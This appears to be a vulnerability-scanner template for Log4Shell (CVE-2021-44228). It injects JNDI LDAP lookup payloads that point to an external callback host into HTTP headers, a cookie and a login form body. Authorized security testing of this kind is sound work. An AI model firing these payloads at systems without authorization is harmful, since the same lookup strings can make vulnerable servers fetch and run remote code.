id: log4shell-detection
info:
  name: Log4Shell (CVE-2021-44228) Remote Code Execution Scanner
  author: Piyush
  severity: critical
  description: |
    Detects potential Log4Shell vulnerability by injecting JNDI payloads
    into headers and parameters. Requires an external collaborator server (DNS/HTTP log).
  tags: log4j,log4shell,rce

variables:
  callback_host: "{{interactsh-url}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: "${jndi:ldap://{{callback_host}}/a}"
      X-Api-Version: "${jndi:ldap://{{callback_host}}/a}"
      Referer: "${jndi:ldap://{{callback_host}}/a}"
      X-Forwarded-For: "${jndi:ldap://{{callback_host}}/a}"
      Cookie: "session=${jndi:ldap://{{callback_host}}/a}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"

  - method: POST
    path:
      - "{{BaseURL}}"

    body: "username=${jndi:ldap://{{callback_host}}/a}&password=test"

    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
